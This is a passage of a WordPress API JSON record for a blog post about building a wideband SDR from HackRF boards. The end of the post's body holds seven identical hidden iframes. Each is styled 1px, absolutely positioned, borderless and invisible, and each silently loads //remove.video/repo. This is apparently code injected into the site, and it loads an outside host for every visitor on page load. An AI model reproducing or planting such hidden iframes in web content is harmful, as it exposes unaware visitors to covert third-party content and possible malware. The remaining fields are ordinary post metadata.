src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n","protected":false},"excerpt":{"rendered":"<p>Who&#8217;s following me on Twitter probably knows some details. I believe this is my most expected article. Last year I came up with the idea to build a wideband SDR. It&#8217;s fun to monitor a wider spectrum and some signals. Sure, USRP is cool but too expensive for amateur usage. I had a few HackRF [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[30,15,69,54],"tags":[91,23,84,129,128,127],"_links":{"self":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/2150"}],"collection":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/comments?post=2150"}],"version-history":[{"count":42,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/2150\/revisions"}],"predecessor-version":[{"id":2207,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/2150\/revisions\/2207"}],"wp:attachment":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/media?parent=2150"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/categories?post=2150"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/tags?post=2150"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}